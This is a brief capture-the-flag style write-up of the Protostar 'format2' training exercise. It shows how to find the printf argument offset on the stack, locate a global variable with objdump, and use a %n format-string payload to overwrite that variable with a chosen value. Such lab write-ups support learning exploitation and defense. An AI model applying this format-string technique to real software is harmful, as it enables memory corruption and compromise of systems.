#Format 2

Similar to last challenge except this time, we have to write the value "64" to target. 

At first I try to print the value from the stack to check where the argument for printf is.

```
[01:00:39] danny@ubuntu:~/Desktop/project/Exploit-Exercises/Protostar/format2$python -c 'print "AAAA" + "%x.%x.%x.%x"' | ./format2 
AAAA200.f7fbdc20.f7fec328.41414141
```

Then get the address of global variable "Target"

```
[01:04:32] danny@ubuntu:~/Desktop/project/Exploit-Exercises/Protostar/format2$objdump -t format2 | grep "target"
0804a030 g     O .bss	00000004              target
```

Overwrite the "poistion" with our "target" address and write 60. 

```
(python -c 'print "\x30\xa0\x04\x08" + "%60x" +  "%4$n"') | ./format2
```

In case you are wondering why %60:

```
[01:09:42] danny@ubuntu:~/Desktop/project/Exploit-Exercises/Protostar/format2$(python -c 'print "\x30\xa0\x04\x08" + "%64x" +  "%4$n"') | ./format2 
0ï¿½                                                             200
target is 68 :(
```
I think this is due to the padding.
